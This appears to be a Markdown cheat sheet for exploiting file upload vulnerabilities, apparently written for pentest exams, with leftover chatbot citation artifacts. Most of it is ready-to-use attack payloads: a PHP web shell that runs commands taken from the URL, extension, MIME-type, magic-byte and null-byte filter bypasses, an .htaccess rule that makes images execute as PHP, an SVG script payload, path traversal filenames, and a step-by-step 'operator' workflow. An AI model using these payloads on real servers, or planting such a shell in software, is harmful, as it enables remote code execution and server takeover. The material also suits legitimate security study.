****

---

``md
> [!ABSTRACT]
> File Upload vulnerabilities occur when an application allows users to upload files **without properly validating them**.  
> This can allow attackers to upload malicious files (e.g., web shells) and execute them on the server. :contentReference[oaicite:0]{index=0}  
> 
> It happens when:
> - File type, content, or extension is not properly validated  
> - Server executes uploaded files  
> - Upload directory is accessible  
> 
> Impact:
> - Remote Code Execution (RCE)  
> - Server takeover  
> - Data exfiltration  
> 
> 🧠 Think: “You’re uploading your own code to run on the server”

---

## 🧠 File Upload Vulnerabilities – Cheat Sheet

---

### 🎯 1. Basic Detection (Upload Test)

> [!CHECK]
> Test what file types are allowed  
> Look for upload success + accessible URL  

```bash
test.jpg
````

```bash
test.php
```

---

### 🧪 2. Basic Web Shell Upload

> [!SUCCESS]  
> Executes system commands if file is executed

```php
<?php system($_GET['cmd']); ?>
```

---

### 🧬 3. Access Uploaded File

> [!SUCCESS]  
> Trigger execution via browser

```bash
/uploads/shell.php?cmd=whoami
```

---

### 🧩 4. Extension Bypass (Blacklist Bypass)

> [!ATTENTION]  
> Use alternative or obfuscated extensions

```bash
shell.php.jpg
```

```bash
shell.phtml
```

```bash
shell.phar
```

---

### 🧪 5. Double Extension Bypass

> [!ATTENTION]  
> Server may parse first extension

```bash
shell.php.jpg
```

```bash
shell.jpg.php
```

---

### 💥 6. MIME Type Bypass

> [!ATTENTION]  
> Modify Content-Type to bypass validation

```http
Content-Type: image/jpeg
```

---

### ⚙️ 7. Magic Bytes Bypass

> [!ATTENTION]  
> Fake file signature to appear as image

```bash
GIF89a;
```

---

### 🧪 8. Null Byte / Special Character Bypass

> [!ATTENTION]  
> Trick server parsing logic

```bash
shell.php%00.jpg
```

---

### 💣 9. .htaccess Trick (Apache)

> [!DANGER]  
> Force server to execute images as PHP

```apache
AddType application/x-httpd-php .jpg
```

---

### 🧪 10. SVG XSS Upload

> [!SUCCESS]  
> Execute JavaScript via uploaded SVG

```xml
<svg xmlns="http://www.w3.org/2000/svg">
<script>alert(1)</script>
</svg>
```

---

### 🧪 11. File Path Traversal Upload

> [!ATTENTION]  
> Try writing outside upload directory

```bash
../../shell.php
```

---

### 🔍 12. Real Workflow (Operator Method)

> [!SUCCESS]

1. Upload normal file:
    

```bash
test.jpg
```

2. Try web shell:
    

```php
<?php system($_GET['cmd']); ?>
```

3. If blocked → bypass:
    

```bash
shell.php.jpg
```

4. Modify request:
    

```http
Content-Type: image/jpeg
```

5. Access file:
    

```bash
/uploads/shell.php?cmd=id
```

---

### 🧠 13. Where to Test

> [!ABSTRACT]

- Profile picture upload
    
- Document upload
    
- Admin panels
    
- API file uploads
    
- Drag & drop uploaders
    

---

## 🔥 Minimal Payload Set (EXAM USE)

> [!SUCCESS]  
> If you remember nothing else

```bash
shell.php
shell.php.jpg
shell.phtml
GIF89a;
Content-Type: image/jpeg
/uploads/shell.php?cmd=id
```

---

## ⚠️ Operator Notes

> [!FAILURE]  
> If nothing happens:
> 
> - File not executable
>     
> - Stored outside web root
>     
> - Proper validation enforced
>     

---

> [!ATTENTION]  
> Upload vuln depends on:
> 
> - Validation (extension, MIME, content)
>     
> - Storage location
>     
> - Execution permissions
>     
> 
> Upload ≠ exploit  
> You need execution to win

---

```

---

## 🔥 Why this one is dangerous

- One of the **easiest ways to get RCE**
- Extremely common in:
  - PHP apps  
  - CMS platforms  
- Often chained with:
  - Path traversal  
  - XXE (via SVG)  
  - SSRF  

---


::contentReference[oaicite:1]{index=1}
``` 

